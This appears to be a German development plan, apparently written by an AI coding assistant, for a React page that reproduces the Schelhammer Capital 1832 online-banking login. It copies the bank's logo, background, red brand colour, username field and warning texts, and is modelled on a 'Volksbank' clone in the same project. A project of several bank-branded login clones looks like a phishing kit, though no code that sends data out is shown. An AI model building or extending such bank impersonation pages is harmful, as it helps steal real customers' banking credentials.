

## Neue Seite `/schelhammer` — Login-Seite für Schelhammer Capital 1832

### Überblick
Neue Seite basierend auf der Volksbank-Struktur, angepasst an das Schelhammer Capital 1832 Branding.

### Vorbereitungen
1. **Assets kopieren** — Logo (`logo-2.jpg`) und Hintergrundbild (`backgroundschel.png`) nach `src/assets/`
2. **Route hinzufügen** — `/schelhammer` in `src/App.tsx`

### Datei: `src/pages/Schelhammer.tsx`

Aufbau analog zu Volksbank, mit folgenden Anpassungen:

1. **Header** — Weißer Hintergrund, Schelhammer-Logo, unterer Rand `#e0e0e0`

2. **Main-Bereich** — Hintergrundbild (Stephansdom), zentrierte Login-Card

3. **Card-Header** — Rote Leiste (`#d31220`) mit "Login"

4. **Card-Body**:
   - Info-Text (deutsch): "Hier können Sie sich für Ihr neues Online Banking anmelden. Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten. Wir werden Sie nie nach Ihrer PIN oder einer TAN fragen!"
   - Demo-Text mit Checkbox-Optik: "Möchten Sie sich die Demo-Version ansehen? In diesem Fall brauchen Sie keine Zugangsdaten anzugeben."
   - Divider
   - Label-Zeile: "Benutzername" links, "Hochkontrast | English" rechts
   - Username-Input (gleicher Stil wie Volksbank, aber Focus-Farbe `#d31220`)
   - "Sie melden sich zum ersten Mal an?" als roter Link, zentriert
   - Nutzungsbedingungen-Text zentriert
   - "Weiter"-Button in `#d31220`
   - Divider
   - "Benutzername vergessen" und "Passwort vergessen" als rote Links, zentriert

5. **Sprachumschaltung** — Toggle "English"/"Deutsch" mit englischen Übersetzungen für alle Texte

6. **Farben**:
   - Primär/Akzent: `#d31220` (statt `#196bc1` bei Volksbank)
   - Links, Button, Card-Header, Focus-States alles in `#d31220`

### Datei: `src/App.tsx`
- Import `Schelhammer` und Route `/schelhammer` hinzufügen

